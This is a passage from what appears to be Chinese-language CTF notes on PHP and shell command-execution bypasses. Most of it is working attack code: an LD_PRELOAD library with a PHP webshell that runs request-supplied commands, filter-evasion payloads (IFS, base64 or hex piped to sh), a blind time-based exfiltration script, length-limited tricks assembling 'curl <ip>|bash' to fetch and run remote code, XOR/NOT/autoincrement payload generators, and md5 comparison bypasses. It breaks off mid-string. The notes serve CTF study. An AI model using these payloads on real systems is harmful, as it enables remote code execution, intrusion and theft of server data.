system(\u0026#34;echo success\u0026#34;); // system(\u0026#34;cat /flag \u0026gt; /tmp/flag\u0026#34;); } int geteuid() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); payload(); } 编译为1.so文件\n上传一个1.php\n\u0026lt;?php putenv(\u0026#34;LD_PRELOAD=./1.so\u0026#34;); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); ?\u0026gt; 上传并访问1.php即可执行\n把要执行的命令赋值到环境变量直接读取命令 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int geteuid() { const char *cmd = getenv(\u0026#34;cmd\u0026#34;); if(getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(cmd); } 编译为2.so文件\n上传一个2.php\n\u0026lt;?php putenv(\u0026#34;LD_PRELOAD=./2.so\u0026#34;); $out_path = \u0026#39;./out.txt\u0026#39;; $cmd = $_REQUEST[\u0026#39;cmd\u0026#39;]; $evil_cmd = $cmd.\u0026#39; \u0026gt; \u0026#39;.$out_path.\u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;; echo $evil_cmd; putenv(\u0026#34;cmd=$cmd\u0026#34;); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); echo file_get_contents($out_path); ?\u0026gt; imagick（扩展） # 蚁剑绕过 # 加载插件-\u0026gt;辅助工具-\u0026gt;绕过 disable_functions\n操作系统连接符 # Linux # ;：多命令顺序执行\n\u0026amp;：多命令顺序执行\n\u0026amp;\u0026amp;：多命令逻辑与，前面的命令执行成功才执行后面的命令\n|：管道输出符，将前面的命令的输出作为后面的命令的输入，把前面命令的结果当成后面命令的参数。会执行，但是只会输出最后一个命令的结果\n例：echo \u0026quot;ls -l\u0026quot; | /bin/bash ||：多命令逻辑或，前面的命令执行失败才执行后面的命令\n%0a：换行\nWindows # 除;外，其他符号都可以使用\n空格过滤绕过 # $IFS 代替空格（内部字段分隔符） # cat /flag -\u0026gt; cat${IFS}/flag\ncat /flag -\u0026gt; cat$IFS/flag\ncat /flag -\u0026gt; cat$IFS$9/flag\n大括号 # cat /flag -\u0026gt; {cat,/flag}\ncat /flag -\u0026gt; cat$'\\x20'/flag\n重定向字符 # cat\u0026lt;/flag %09（Tab） # cat /flag -\u0026gt; cat%09/flag 文件名过滤绕过 # 通配符 # cat /flag -\u0026gt; cat /fla?\ncat /flag -\u0026gt; cat /fla*\ncat /flag -\u0026gt; cat /fla[g]\n单双引号绕过 # cat /flag -\u0026gt; cat /f\u0026quot;\u0026quot;lag\ncat /flag -\u0026gt; cat /f''lag\n反斜杠绕过 # 反斜杠把特殊字符去掉功能性，单纯表示为字符串\ncat /flag -\u0026gt; cat /fla\\g 特殊变量 # $1 到$9、$@、$*\ncat /flag -\u0026gt; cat /f$1la$9g\ncat /flag -\u0026gt; cat /f$*\\lag\n内联执行（$拼接） # cat /flag -\u0026gt; a=f;cat $alag 利用 linux 中的环境变量 # echo $PATH # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin cat /flag -\u0026gt; cat ${PATH:0:1}f${PATH:5:1}ag 常见文件读取命令绕过 # cat\ntac: 从最后一行开始显示，可以看出tac是cat的倒着写\nnl: 显示的时候，顺便输出行号\nmore: 一页一页的显示文件内容\nless: 与more类似，但是比more更好的是，他可以往前翻页\nhead: 只看头几行\ntail: 只看尾巴几行\nod: 以二进制的方式读取文件（转换成字符：od -A d -c /flag）\nstrings: 以字符串的方式读取文件\nxxd: 以 16 进制的方式读取文件\niconv: 转换文件编码\nbase64: 以 base64 的方式读取文件（还有base32、base58）\nsort: 排序\nuniq: 去重\nfile -f: 识别文件类型，-f 参数表示识别文件中表示的文件路径，报错就可以显示出文件内容（no such file or directory）\ngrep: 用法：grep { /flag，表示在flag文件中查找{字符串\n编码绕过 # base64 # cat /flag -\u0026gt; echo Y2F0IC9mbGFn | base64 -d | sh\ncat /flag -\u0026gt; `echo Y2F0IC9mbGFn | base64 -d` （Linux 中反引号表示执行命令）\ncat /flag -\u0026gt; $(echo Y2F0IC9mbGFn | base64 -d)\ncat /flag -\u0026gt; printf \u0026quot;Y2F0IC9mbGFn\u0026quot; | base64 -d | sh\nbase32 # cat /flag -\u0026gt; echo MNQXIIBPMZWGCZY= | base32 -d | sh base58 # cat /flag -\u0026gt; echo 2GNQyDr4iit1c | base58 -d | sh HEX 编码 # cat /flag -\u0026gt; echo 636174202f666c6167 | xxd -r -p | sh shellcode # cat /flag -\u0026gt; echo -ne \u0026quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026quot; | sh\ncat /flag -\u0026gt; printf \u0026quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026quot; | sh\n无回显时间盲注 # cat /flag -\u0026gt; if [ $(cat /flag | awk NR==1 | cut -c 1) == a ];then sleep 2;fi awk NR==1表示输出第一行 cut -c 1表示输出第一个字符 import requests import time def handle_exp(exp): return exp url = \u0026#34;http://192.168.1.1/1.php\u0026#34; param = \u0026#34;a\u0026#34; cmd = \u0026#34;cat /flag\u0026#34; result = \u0026#34;\u0026#34; for line in range(1, 10): for letter in range(1, 50): for acc in range(32, 126): exp = f\u0026#34;if [ $({cmd} | awk NR=={line} | cut -c {letter}) == {chr(acc)} ];then sleep 3;fi\u0026#34; # print(exp) try: res = requests.get(url + f\u0026#34;?{param}={handle_exp(exp)}\u0026#34;, timeout=2) # data = {param: cmd} # res = requests.post(url=url, data=data) except TimeoutError: result += chr(acc) print(chr(acc)) print(result) 长度过滤绕过 # 相关命令 # \u0026gt;和\u0026gt;\u0026gt;：重定向符，\u0026gt;表示覆盖，\u0026gt;\u0026gt;表示追加\n\u0026gt; test可以创建一个名为 test 的文件，类似 touch 命令 \\：换行符\nls -t：按照时间排序，最新的文件在最前面。\n默认按照文件名 ascii 码排序 注意时间只能精确到秒 dir：列出文件名，好处：不换行，\u0026ldquo;d\u0026quot;排名靠前\n$(dir *) 如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入 rev：输出文本内容但是反转每一行的字符顺序\n组合运用 # 对命令长度有限制时，把一些很短的文件名拼接成可执行命令\n\u0026gt; 创建很短的文件名\nls -t 按时间顺序列出文件名，按行存储\n\\ 连接换行命令\nsh 从文件中读取命令\n第一步：创建文件\n\u0026gt;ag \u0026gt;fl\\\\ \u0026gt;\u0026#34;t \\\\\u0026#34; \u0026gt;ca\\\\ 第二步：将命令拼接到文件中\nls -t\u0026gt;x 第三步：执行命令\nsh \u0026lt; x # 或 sh x # 或 . x 长度限制为 5 的绕过 # 1. 构造 ls -t\u0026gt;y # \u0026gt;ls\\\\ # \u0026#34;ls\\\u0026#34; ls\u0026gt;_ # 将 ls\\写入_文件 \u0026gt;\\ \\\\ # \u0026#34; \\\u0026#34; \u0026gt;-t\\\\ # \u0026#34;-t\\\u0026#34; \u0026gt;\\\u0026gt;y # \u0026#34;\u0026gt;y\u0026#34; ls\u0026gt;\u0026gt;_ 2. 分解命令，创建文件 # # 构造 curl 192.168.1.161|bash \u0026gt;bash \u0026gt;\\|\\\\ \u0026gt;61\\\\ \u0026gt;1\\\\ \u0026gt;1.\\\\ \u0026gt;68\\\\ \u0026gt;2.\\\\ \u0026gt;19\\\\ \u0026gt;\\ \\\\ \u0026gt;rl\\\\ \u0026gt;cu\\\\ 3. 执行脚本 # sh _ sh y 长度限制为 4 的绕过 # 前置知识 # ls\u0026gt;\u0026gt;_: 不再适用 *：相当于$(dir *)，如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入 1. 构造 ls -t\u0026gt;g # \u0026gt;g\\\u0026gt; # \u0026#34;g\u0026gt;\u0026#34; \u0026gt;ht- # \u0026#34;ht-\u0026#34; 使文件名排列为\u0026#34;g\u0026gt; ht- sl\u0026#34; \u0026gt;sl # \u0026#34;sl\u0026#34; \u0026gt;dir # ls: dir \u0026#39;g\u0026gt;\u0026#39; ht- sl *\u0026gt;v # 执行 dir 命令，将结果写入 v 文件 # cat v: g\u0026gt; ht- sl \u0026gt;rev *v\u0026gt;x # *v 相当于 rev 命令，将结果写入 x 文件 # cat x: ls -th \u0026gt;g 2. 分解命令，创建文件 # # 构造 curl 192.168.1.161|bash，但是 ip 用 16 进制表示：curl 0xc0a801a1|bash，因为\u0026#34;.\u0026#34;不方便处理 \u0026gt;ash \u0026gt;b\\ \u0026gt;\\|\\ \u0026gt;A1\\ \u0026gt;01\\ \u0026gt;A8\\ \u0026gt;C0\\ \u0026gt;0x\\ \u0026gt;\\\\ \u0026gt;rl\\ \u0026gt;cu\\ 3. 执行脚本 # sh x sh g 无参数 # if(\u0026#39;;\u0026#39;===preg_replace(\u0026#39;/[^\\W]+\\((?R)?\\)/\u0026#39;,\u0026#39;\u0026#39;,$_GET[\u0026#39;code\u0026#39;])){ eval($_GET[\u0026#39;code\u0026#39;]); } 如果是字母、数字、下划线+();，如 a();，则替换后为\u0026rdquo;;\u0026quot;，判断为 true，括号内不能带内容，否则匹配不到，不能替换为空，判断为 false ?R 表示递归匹配，即匹配 a(b(c())); 常见函数解释 # print_r(?): 打印变量\neval(string): 执行字符串中的 PHP 代码\npos(array): 返回数组第一个的值\nend(array): 返回数组最后一个的值\nnext(array): 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位\nsession_start(): 启动或重用会话，成功返回 true，失败返回 false\nsession_id(session): 获取会话 ID\nshow_source(file): 显示文件的源码\n无参数命令执行请求头绕过 # 请求头 RCE # HTTP 请求标头（php7.3） # getallheaders(): 获取所有的 HTTP 请求标头，显示顺序是和发送的顺序相反的\napache_request_headers()\nexp：利用请求头进行 RCE # 抓包，在请求头中添加最后一行（或者修改最后一行）：flag: system('cat /flag');\n?code=eval(pos(getallheaders()));\n利用全局变量进行 RCE（php5/7） # get_defined_vars(): 返回所有已定义变量的数组 返回数组顺序为 GET-\u0026gt;POST-\u0026gt;COOKIE-\u0026gt;SERVER-\u0026gt;ENV-\u0026gt;FILES-\u0026gt;REQUEST-\u0026gt;GLOBALS\nexp：利用全局变量进行 RCE # ?code=eval(end(pos(get_defined_vars())));\u0026amp;cmd=system('id');\n?code=eval(system(key(pos(get_defined_vars()))));\u0026amp;cat${IFS}/flag=1;\n利用 session（php5） # exp1 # 将 PHPSESSID 改为./flag\n?code=show_source(session_id(session_start()));\n即可读取 flag 文件\nexp2 # 使用eval() PHPSESSID 改为phpinfo(); 无法直接执行，需要先把命令转成 16 进制写入 PHPSSID 再是使用hex2bin()函数转换成二进制数，用 eval 执行\n?code=eval(hex2bin(session_id(session_start())));\n使用 scandir() 进行文件读取 # 函数 # scandir(dir): 返回一个包含有指定路径中的文件和目录的数组 getcwd(): 返回当前工作目录 chdir(dir): 改变当前工作目录 current(array): 返回数组中的当前元素的值（第一个） next(array): 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位 array_reverse(array): 返回一个单元顺序相反的数组 array_flip(array): 交换数组中的键和值 array_rand(array): 从数组中随机取出一个或多个单元 strrev(string): 反转字符串 crypt(string): 单向加密字符串 hebrevc(string): 将希伯来文本从右往左转换为从左往右 localeconv(): 可以输出一个第一项为\u0026quot;.\u0026ldquo;的数组 dirname(path): 返回路径中的目录部分（去掉路径中的最后一个文件名或目录） exp：使用 localeconv()（.）读取当前目录的文件 # 列出当前目录下的文件\n?code=print_r(scandir(current(localeconv())));\n假设目录结构如下：\n. .. 1.php flag.php 反转目录\n?code=print_r(array_reverse(scandir(current(localeconv()))));\n读取目录的最后一个（反转后的第一个）\n?code=show_source(current(array_reverse(scandir(current(localeconv())))));\nexp：使用 getcwd() 读取本级或上级目录的文件 # 列出当前目录下的文件\n?code=print_r(scandir(getcwd()));\n列出上级目录下的文件\n?code=print_r(scandir(dirname(getcwd())));\n读取上级目录的最后一个\n?code=show_source(current(array_reverse(scandir(chdir(dirname(getcwd()))))));\n随机读取上级目录任意文件（array_flip）\n?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); 👇 getcwd() 获取当前工作目录。 dirname(getcwd()) 获取当前工作目录的父目录。 chdir(dirname(getcwd())) 将当前工作目录更改为其父目录。 scandir(dirname(chdir(dirname(getcwd())))) 读取新的工作目录（即原来的父目录）下的所有文件和目录。 array_flip(scandir(dirname(chdir(dirname(getcwd()))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。 array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))) 从键（即文件和目录名）中随机选择一个。 show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))) 显示所选文件的源代码。\n?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))))); 👇 getcwd() 获取当前工作目录。 scandir(getcwd()) 读取当前工作目录下的所有文件和目录。 next(scandir(getcwd())) 获取当前工作目录下的下一个文件或目录。 chdir(next(scandir(getcwd()))) 将当前工作目录更改为下一个文件或目录。 crypt(chdir(next(scandir(getcwd())))) 对新的工作目录进行哈希加密。 hebrevc(crypt(chdir(next(scandir(getcwd()))))) 将加密后的字符串进行反转。 ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))) 获取反转后的字符串的第一个字符的 ASCII 值。 chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))) 将 ASCII 值转换回字符。 scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。 array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。 array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))) 从键（即文件和目录名）中随机选择一个。 show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))))) 显示所选文件的源代码。\n?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));\nphpversion() 获取当前 PHP 的版本号。 crypt(phpversion()) 对 PHP 版本号进行哈希加密。 hebrevc(crypt(phpversion())) 将加密后的字符串进行反转。 ord(hebrevc(crypt(phpversion()))) 获取反转后的字符串的第一个字符的 ASCII 值。 chr(ord(hebrevc(crypt(phpversion())))) 将 ASCII 值转换回字符。 scandir(chr(ord(hebrevc(crypt(phpversion()))))) 试图读取由 ASCII 值表示的目录下的所有文件和目录。 next(scandir(chr(ord(hebrevc(crypt(phpversion())))))) 获取当前工作目录下的下一个文件或目录。 chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))) 将当前工作目录更改为下一个文件或目录。 crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))) 对新的工作目录进行哈希加密。 hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))) 将加密后的字符串进行反转。 ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))) 获取反转后的字符串的第一个字符的 ASCII 值。 chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))) 将 ASCII 值转换回字符。 scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。 array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。 array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))) 从键（即文件和目录名）中随机选择一个。 show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))) 显示所选文件的源代码。\nexp：使用 array() 读取根目录 # ?code=print_r(serialize(array())); 👇 a:0:{}\n?code=print_r(crypt(serialize(array()))); 随机加密，有几率结尾会有\u0026rdquo;/\u0026quot;👇 $1$kQp4VPZo$.cwWophFa8mHwHf4etyWP/\n将结果反转 ?code=print_r(strrev(crypt(serialize(array())))); 👇 /n9RZqndDIdPVfDBo62HOT$EiorHvqj$1$\n取第一位（利用 ord() 只能取第一位的特性） ?code=print_r(chr(ord(strrev(crypt(serialize(array())))))); 👇 /\n列出根目录下的文件 ?code=print_r(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))));\n随机读取某个文件 ?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));\n无字母数字绕过 # \u0026lt;? if(!preg_match(\u0026#39;/[a-z0-9]/is\u0026#39;,$_GET[\u0026#39;code\u0026#39;])){ eval($_GET[\u0026#39;code\u0026#39;]); } 异或运算绕过 # // 生成所有可见字符的异或构造结果 \u0026lt;?php /*author yu22x*/ $myfile = fopen(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); $contents = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; 256; $i++) { for ($j = 0; $j \u0026lt; 256; $j++) { if ($i \u0026lt; 16) { $hex_i = \u0026#39;0\u0026#39; . dechex($i); } else { $hex_i = dechex($i); } if ($j \u0026lt; 16) { $hex_j = \u0026#39;0\u0026#39; . dechex($j); } else { $hex_j = dechex($j); } $preg = \u0026#39;/[a-z0-9]/i\u0026#39;; //根据题目给的正则表达式修改即可 if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) { echo \u0026#34;\u0026#34;; } else { $a = \u0026#39;%\u0026#39; . $hex_i; $b = \u0026#39;%\u0026#39; . $hex_j; $c = (urldecode($a) ^ urldecode($b)); if (ord($c) \u0026gt;= 32 \u0026amp; ord($c) \u0026lt;= 126) { $contents = $contents . $c . \u0026#34; \u0026#34; . $a . \u0026#34; \u0026#34; . $b . \u0026#34;\\n\u0026#34;; } } } } fwrite($myfile, $contents); fclose($myfile); # 构造 payload # -*- coding: utf-8 -*- # author yu22x import requests import urllib from sys import * import os def action(arg): s1 = \u0026#34;\u0026#34; s2 = \u0026#34;\u0026#34; for i in arg: f = open(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;r\u0026#34;) while True: t = f.readline() if t == \u0026#34;\u0026#34;: break if t[0] == i: # print(i) s1 += t[2:5] s2 += t[6:9] break f.close() output = \u0026#39;(\u0026#34;\u0026#39; + s1 + \u0026#39;\u0026#34;^\u0026#34;\u0026#39; + s2 + \u0026#39;\u0026#34;)\u0026#39; return output while True: param = ( action(input(\u0026#34;\\n[+] your function：\u0026#34;)) + action(input(\u0026#34;[+] your command：\u0026#34;)) + \u0026#34;;\u0026#34; ) print(param) # 运行结果 [+] your function：system [+] your command：ls (\u0026#34;%08%02%08%08%05%0d\u0026#34;^\u0026#34;%7b%7b%7b%7c%60%60\u0026#34;)(\u0026#34;%0c%08\u0026#34;^\u0026#34;%60%7b\u0026#34;); 或运算绕过 # \u0026lt;?php // 生成或构造结果 /* author yu22x */ $myfile = fopen(\u0026#34;or_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); $contents = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; 256; $i++) { for ($j = 0; $j \u0026lt; 256; $j++) { if ($i \u0026lt; 16) { $hex_i = \u0026#39;0\u0026#39; . dechex($i); } else { $hex_i = dechex($i); } if ($j \u0026lt; 16) { $hex_j = \u0026#39;0\u0026#39; . dechex($j); } else { $hex_j = dechex($j); } $preg = \u0026#39;/[0-9a-z]/i\u0026#39;; //根据题目给的正则表达式修改即可 if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) { echo \u0026#34;\u0026#34;; } else { $a = \u0026#39;%\u0026#39; . $hex_i; $b = \u0026#39;%\u0026#39; . $hex_j; $c = (urldecode($a) | urldecode($b)); if (ord($c) \u0026gt;= 32 \u0026amp; ord($c) \u0026lt;= 126) { $contents = $contents . $c . \u0026#34; \u0026#34; . $a . \u0026#34; \u0026#34; . $b . \u0026#34;\\n\u0026#34;; } } } } fwrite($myfile, $contents); fclose($myfile); # 构造 payload # -*- coding: utf-8 -*- # author yu22x import requests import urllib from sys import * import os def action(arg): s1=\u0026#34;\u0026#34; s2=\u0026#34;\u0026#34; for i in arg: f=open(\u0026#34;or_rce.txt\u0026#34;,\u0026#34;r\u0026#34;) while True: t=f.readline() if t==\u0026#34;\u0026#34;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;|\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; return(output) while True: param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;))+\u0026#34;;\u0026#34; print(param) # 运行结果 [+] your function：system [+] your command：ls (\u0026#34;%13%19%13%14%05%0d\u0026#34;|\u0026#34;%60%60%60%60%60%60\u0026#34;)(\u0026#34;%0c%13\u0026#34;|\u0026#34;%60%60\u0026#34;); 取反绕过 # \u0026lt;?php //在命令行中运行 /*author yu22x*/ fwrite(STDOUT, \u0026#39;[+]your function: \u0026#39;); $system = str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); fwrite(STDOUT, \u0026#39;[+]your command: \u0026#39;); $command = str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); echo \u0026#39;[*] (~\u0026#39; . urlencode(~$system) . \u0026#39;)(~\u0026#39; . urlencode(~$command) . \u0026#39;);\u0026#39;; # 运行结果 [+]your function: system [+]your command: ls [*] (~%8C%86%8C%8B%9A%92)(~%93%8C); 自增绕过 # //测试发现 7.0.12 以上版本不可使用 //使用时需要 url 编码下 $_=[];$_=@\u0026#34;$_\u0026#34;;$_=$_[\u0026#39;!\u0026#39;==\u0026#39;@\u0026#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=\u0026#39;_\u0026#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 固定格式 构造出来的 assert($_POST[_]); 然后 post 传入 _=phpinfo(); 上传临时文件绕过 # 题目代码\n\u0026lt;?php if(isset($_GET[\u0026#39;code\u0026#39;])){ $code = $_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;35){ //长度不能超过 35 die(\u0026#34;Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9_$]+/\u0026#34;,$code)){ //不能包含下划线和$ die(\u0026#34;NO.\u0026#34;); } eval($code); }else{ highlight_file(__FILE__); } exp\n#coding:utf-8 #author yu22x import requests url=\u0026#34;http://xxx/test.php?code=?\u0026gt;\u0026lt;?=`. /???/????????[@-[]`;?\u0026gt;\u0026#34; files={\u0026#39;file\u0026#39;:\u0026#39;cat f*\u0026#39;} response=requests.post(url,files=files) html = response.text print(html) "},{"id":40,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%9F%BA%E7%A1%80/","title":"Php基础","section":"Docs","content":" 常见函数 # highlight_file() 函数对文件进行语法高亮显示，本函数是 show_source() 的别名\nnext() 输出数组中的当前元素和下一个元素的值。\narray_reverse() 函数以相反的元素顺序返回数组。（主要是能返回值）\nscandir() 函数返回指定目录中的文件和目录的数组。\npos() 输出数组中的当前元素的值。\nlocaleconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是\u0026quot;.\u0026quot;。\nsession_id() 函数返回当前会话 ID（可在 http 请求中的 Cookie 中修改）。\n"},{"id":41,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/","title":"Php特性大全（不完整","section":"Docs","content":" PHP 特性大全 # 哈希比较 # md5/sha1 弱比较（==）的绕过 # 两变量值不相等，md5 计算散列值后相等的绕过\n\u0026lt;?php if($_GET[\u0026#39;a\u0026#39;] !== $_GET[\u0026#39;b\u0026#39;]){ if(md5($_GET[\u0026#39;a\u0026#39;]) == md5($_GET[\u0026#39;b\u0026#39;])){ echo \u0026#34;flag\u0026#34;; } } ?\u0026gt; PHP 中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。PHP 在处理哈希字符串的时候，它把每一个以 0e 开头并且后面字符均为纯数字的哈希值都解析为 0。常见的如下：\n在 md5 加密后以 0E 开头\nQNKCDZO 240610708 s878926199a s155964671a 以下串在 sha1 加密后以 0E 开头，并且后面均为纯数字\naaroZmOk aaK1STfY payload: /?a=QNKCDZO\u0026amp;b=240610708\nmd5/sha1 强比较（===）的绕过 # \u0026lt;?php if($_GET[\u0026#39;a\u0026#39;] !== $_GET[\u0026#39;b\u0026#39;]){ if(md5($_GET[\u0026#39;a\u0026#39;]) === md5($_GET[\u0026#39;b\u0026#39;])){ echo \u0026#34;flag\u0026#34;; } } ?\u0026gt; ===会比较类型，这个时候可以用到 PHP 中 md5() 函数无法处理数组（会返回 NULL）来实现绕过。\npayload: /?a[]=1\u0026amp;b[]=2\nmd5 碰撞 # if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } 这里和上面不同之处在于有一个强制类型转化，若传入数组转化后的结果都是字符串 Array。这里需要用到的是 MD5 碰撞，也就是不同字符串但是 MD5 后值相同的情况。下面的任意两组字符串内容不同，但 md5 结果相同。\n$s1 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34; $s2 = 